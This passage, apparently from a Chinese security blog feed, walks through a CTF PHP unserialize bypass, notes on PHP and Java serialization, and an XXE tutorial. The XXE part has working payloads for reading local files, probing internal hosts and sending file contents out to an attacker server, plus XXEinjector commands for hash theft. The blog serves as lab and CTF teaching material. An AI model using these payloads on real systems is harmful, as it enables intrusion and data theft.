function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路：主要是正则绕过和_wakeup（）绕过</p><p>正则匹配：因为不能匹配<code>O:4</code>这种，我们可以<code>O:+4</code>绕过，因为在url编码中<code>+</code>会被转换为空格</p><p>__wakeup()绕过：让序列化结果中类属性的数值大于其真正的数值进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> demo;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  <span class="comment">//echo  O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line"><span class="variable">$b</span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);     </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到</p><blockquote><p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</p></blockquote><p>再进行get传参即可</p><h3 id="php序列化补充"><a href="#php序列化补充" class="headerlink" title="php序列化补充"></a>php序列化补充</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码<br>执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行<br>反序列化的时候就有可能会触发对象中的一些魔术方法。</p><p><strong>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串</strong><br><strong>unserialize() &#x2F;&#x2F;将字符串还原成一个对象</strong></p><p>触发：<code>unserialize </code>函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><blockquote><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用 isset()或 empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用 <span class="built_in">unset</span>()时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h3 id="构造函数与析构函数"><a href="#构造函数与析构函数" class="headerlink" title="构造函数与析构函数"></a>构造函数与析构函数</h3><ul><li>__construct()<br>具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li><li>__destruct()<br>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li></ul><p><code>new</code>出一个新的对象时就会调用__construct(),而对象被销毁时，例如程序退出时，就会调用__destruct()</p><h3 id="序列化细节"><a href="#序列化细节" class="headerlink" title="序列化细节"></a>序列化细节</h3><h4 id="序列化含义"><a href="#序列化含义" class="headerlink" title="序列化含义"></a>序列化含义</h4><p>例如：<code>O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:3:&quot;LEO&quot;;&#125;</code><br> O代表对象；4代表对象名长度；2代表2个成员变量；其余参照如下</p><table><thead><tr><th align="center">类型</th><th align="center">结构</th></tr></thead><tbody><tr><td align="center">String</td><td align="center">s:size:value;</td></tr><tr><td align="center">Integer</td><td align="center">i:value;</td></tr><tr><td align="center">Boolean</td><td align="center">b:value;(保存1或0)</td></tr><tr><td align="center">Null</td><td align="center">N;</td></tr><tr><td align="center">Array</td><td align="center">a:size:</td></tr><tr><td align="center">Object</td><td align="center">O:strlen(object name):object name:object size:</td></tr></tbody></table><h4 id="public、protected、private下序列化对象的区别"><a href="#public、protected、private下序列化对象的区别" class="headerlink" title="public、protected、private下序列化对象的区别"></a>public、protected、private下序列化对象的区别</h4><p>php v7.x反序列化的时候对访问类别不敏感</p><ul><li>public变量<br>直接变量名反序列化出来</li><li>protected变量<br><code>\x00 + * + \x00 + 变量名</code><br>可以用<code>S:5:&quot;\00*\00op&quot;</code>来代替<code>s:5:&quot;?*?op&quot;</code></li><li>private变量<br><code>\x00 + 类名 + \x00 + 变量名</code></li></ul><h2 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h2><p>下方的特征可以作为序列化的标志参考:</p><ul><li><p>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p></li><li><p>或者如果以<code>aced</code>开头，那么他就是这一段java序列化的16进制</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Java </tag>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML XXE漏洞</title>
      <link href="/XML-XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/XML-XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XML-XXE漏洞"><a href="#XML-XXE漏洞" class="headerlink" title="XML XXE漏洞"></a>XML XXE漏洞</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="1、xml基础概念"><a href="#1、xml基础概念" class="headerlink" title="1、xml基础概念"></a>1、xml基础概念</h3><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h3 id="2、XML与HTML的主要差异"><a href="#2、XML与HTML的主要差异" class="headerlink" title="2、XML与HTML的主要差异"></a>2、XML与HTML的主要差异</h3><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML被设计用来显示数据，其焦点是数据的外观。</p><p>HTML旨在显示信息，而XML旨在传输信息。</p><h3 id="3、xml示例"><a href="#3、xml示例" class="headerlink" title="3、xml示例"></a>3、xml示例</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [&lt;!--定义此文档时note类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD：Document Type Definition  即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p><p>DTD一般认为有两种引用或声明方式：</p><ul><li>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li><li>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li></ul><p>DTD实体有以下几种声明方式</p><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;a<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- admin --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- awsl --&gt;</span></span><br></pre></td></tr></table></figure><ul><li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li></ul><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;c<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729103931875.png" alt="image-20230729103931875"></p><p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163325966.png" alt="image-20230805163325966"></p><h3 id="靶场讲解-pikachu-xxe漏洞"><a href="#靶场讲解-pikachu-xxe漏洞" class="headerlink" title="靶场讲解 (pikachu xxe漏洞)"></a>靶场讲解 (pikachu xxe漏洞)</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729102633777.png" alt="image-20230729102633777"></p><ol><li>文件读取</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/test.txt&quot;</span> &gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163353148.png" alt="image-20230805163353148"></p><ol start="2"><li>内网探针或攻击内网应用（触发漏洞地址）</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTYTY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.1.4:80/index.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的ip地址假设就是内网的一台服务器的ip地址。还可以进行一个端口扫描，看一下端口是否开放。</p><p><strong>无回显-读取文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.xx.xxx:80XX/test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM</span><br><span class="line">&#x27;http://192.168.xx.xxx:80xx/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><p>上面的url一般是自己的网站，通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="ENTITY-SYSTEM-file等关键词被过滤"><a href="#ENTITY-SYSTEM-file等关键词被过滤" class="headerlink" title="ENTITY SYSTEM file等关键词被过滤"></a>ENTITY SYSTEM file等关键词被过滤</h3><p>使用编码方式绕过：UTF-16BE<br> <code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p><p>若http被过滤，可以</p><h3 id="data-协议绕过"><a href="#data-协议绕过" class="headerlink" title="data:&#x2F;&#x2F;协议绕过"></a>data:&#x2F;&#x2F;协议绕过</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="string">&quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="file-协议加文件上传"><a href="#file-协议加文件上传" class="headerlink" title="file:&#x2F;&#x2F;协议加文件上传"></a>file:&#x2F;&#x2F;协议加文件上传</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php-filter协议加文件上传"><a href="#php-filter协议加文件上传" class="headerlink" title="php:&#x2F;&#x2F;filter协议加文件上传"></a>php:&#x2F;&#x2F;filter协议加文件上传</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h1 id="xxe工具"><a href="#xxe工具" class="headerlink" title="xxe工具"></a>xxe工具</h1><p>​          XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。这里建议在kali环境下运行。</p><h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">--host     必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)</span><br><span class="line">--file      必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)</span><br><span class="line">--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)</span><br><span class="line">--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)</span><br><span class="line">--logger        记录输出结果。</span><br><span class="line">--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)</span><br><span class="line">--rport          远程主机的TCP端口信息。(--rport=8080)</span><br><span class="line">--phpfilter    在发送消息之前使用PHP过滤器对目标文件进行Base64编码。</span><br><span class="line">--netdoc     使用netdoc协议。(Java).</span><br><span class="line">--enumports   枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)</span><br><span class="line">--hashes       窃取运行当前应用程序用户的Windows哈希。</span><br><span class="line">--expect        使用PHP expect扩展执行任意系统命令。(--expect=<span class="built_in">ls</span>)</span><br><span class="line">--upload       使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)</span><br><span class="line">--xslt      XSLT注入测试。</span><br><span class="line">--ssl              使用SSL。</span><br><span class="line">--proxy         使用代理。(--proxy=127.0.0.1:8080)</span><br><span class="line">--httpport Set自定义HTTP端口。(--httpport=80)</span><br><span class="line">--ftpport       设置自定义FTP端口。(--ftpport=21)</span><br><span class="line">--gopherport  设置自定义gopher端口。(--gopherport=70)</span><br><span class="line">--jarport       设置自定义文件上传端口。(--jarport=1337)</span><br><span class="line">--xsltport  设置自定义用于XSLT注入测试的端口。(--xsltport=1337)</span><br><span class="line">--<span class="built_in">test</span>     该模式可用于测试请求的有效。</span><br><span class="line">--urlencode     URL编码，默认为URI。</span><br><span class="line">--output       爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)</span><br><span class="line">--<span class="built_in">timeout</span>     设置接收文件/目录内容的Timeout。(--<span class="built_in">timeout</span>=20)</span><br><span class="line">--contimeout  设置与服务器断开连接的，防止DoS出现。(--contimeout=20)</span><br><span class="line">--fast     跳过枚举询问，有可能出现结果假阳性。</span><br><span class="line">--verbose     显示verbose信息。</span><br></pre></td></tr></table></figure><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>枚举HTTPS应用程序中的&#x2F;etc目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl</span><br></pre></td></tr></table></figure><p>使用gopher（OOB方法）枚举&#x2F;etc目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher</span><br></pre></td></tr></table></figure><p>二次漏洞利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt</span><br></pre></td></tr></table></figure><p>使用HTTP带外方法和netdoc协议对文件进行爆破攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc</span><br></pre></td></tr></table></figure><p>通过直接性漏洞利用方式进行资源枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK</span><br></pre></td></tr></table></figure><p>枚举未过滤的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all</span><br></pre></td></tr></table></figure><p>窃取Windows哈希：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes</span><br></pre></td></tr></table></figure><p>使用Java jar上传文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf</span><br></pre></td></tr></table></figure><p>使用PHP expect执行系统指令：</p><figure class="highlight 